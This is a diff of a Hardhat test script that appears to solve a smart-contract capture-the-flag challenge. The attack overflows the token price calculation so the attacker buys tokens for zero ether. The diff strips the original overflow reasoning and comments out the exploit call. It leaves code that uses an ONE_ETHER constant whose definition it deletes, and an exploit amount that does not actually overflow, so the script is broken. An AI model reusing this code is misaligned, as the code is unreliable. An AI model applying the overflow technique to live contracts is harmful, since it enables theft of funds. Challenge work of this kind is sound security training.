@@ -2,11 +2,10 @@ import crypto from "crypto";
 import { ethers } from "hardhat";
 import { BigNumber, Contract, Signer } from "ethers";
 import { expect } from "chai";
-// import { formatEtherscanTx } from "../utils/format";
 
 let accounts: Signer[];
 let eoa: Signer;
-let contract: Contract; // challenge contract
+let contract: Contract;
 
 before(async () => {
   accounts = await ethers.getSigners();
@@ -20,52 +19,29 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
-  // we want an overflow in this line of the contract:
-  // uint256 = numTokens * 1 ether = numTokens * 10 ^ 18
-  // when x is the amount of tokens we will receive (input to buy)
-  // then we need to pay ceil(x / 10^18) * 10^18 mod 2^256 (overflow amount) in value
-  // try to minimize this payment value for x >= 2^256 (when overflow happens)
-  // not sure how to do it analytically, but we can just start with x = 2^256
-  // as 2^256 and 10^18 = (2*5)^18 = 2^18*5^18, multiplying by prime 3 should
-  // give us a good cycle to check for min value
-  const ONE_ETHER = BigNumber.from(`10`).pow(`18`);
-  // const computePayment = (x: BigNumber) => {
-  //   // there's a remainder that is cut off, need to increase division result by 1
-  //   let toBuy = x.div(ONE_ETHER).add(`1`);
-  //   let overflowRemainder = toBuy
-  //     .mul(ONE_ETHER)
-  //     .mod(BigNumber.from(`2`).pow(`256`));
-  //   return { toBuy, toPay: overflowRemainder };
-  // };
-  // let MAX_UINT256 = BigNumber.from(`2`).pow(`256`);
-  // let multiplier = BigNumber.from(`3`)
-  // let bestPair: ReturnType<typeof computePayment> = {
-  //   toBuy: BigNumber.from(`0`),
-  //   toPay: BigNumber.from(ethers.utils.parseEther(`1`)),
-  // };
 
-  // // make sure toBuy = x / ONE_ETHER
-  // while(true) {
-  //   multiplier = multiplier.mul(`3`);
-  //   const result = computePayment(MAX_UINT256.mul(multiplier))
 
-  //   // make sure to buy still fits in uint256 for function call
-  //   if(result.toBuy.gte(MAX_UINT256)) break;
+  const uintMax = BigNumber.from(`2`).pow(`256`)
+  const expectedBeUintMax = uintMax.div(ONE_ETHER)
+  console.log( "2^256/ether = does it include the floating precision? : " + uintMax.div(ONE_ETHER))
 
-  //   if(result.toPay.lt(bestPair.toPay)) {
-  //     bestPair = result
-  //   }
-  // }
+  // expect(uintMax).to.equal(expectedBeUintMax)
+  // console.log( "ether/ether = 1 : " + ONE_ETHER.div(ONE_ETHER))
+  // expect(ONE_ETHER.div(ONE_ETHER)).to.equal(1)
 
-  // console.log(`buying`, bestPair.toBuy.toString());
-  // console.log(`paying`, ethers.utils.formatEther(bestPair.toPay), `ETH`);
+  // console.log("2^256 is : " + uintMax.div(ONE_ETHER).mul(ONE_ETHER))
 
-  await contract.buy(BigNumber.from(`2`).pow(`256`).div(ONE_ETHER), {
-    value: 0,
-  });
+  // const expectedBeZero = (uintMax.div(ONE_ETHER).mul(ONE_ETHER).mod(BigNumber.from(`2`).pow(`256`)))
+  // console.log(`expectedBeZero`, expectedBeZero)
+  // const toBuy = (BigNumber.from(`2`).pow(`256`).div(ONE_ETHER)).toString()
+  // console.log(`budying `, (BigNumber.from(`2`).pow(`256`).div(ONE_ETHER)).toString());
 
-  const balance: BigNumber = await contract.balanceOf(await eoa.getAddress());
-  console.log(`balance`, balance.toString());
+  // await contract.buy((BigNumber.from(`2`).pow(`256`).div(ONE_ETHER)).toString(), {
+  //   value: 0,
+  // });
+
+  // const balance: BigNumber = await contract.balanceOf(await eoa.getAddress());
+  // console.log(`balance`, balance.toString());
 
   // const tx = await contract.sell(`1`);
 
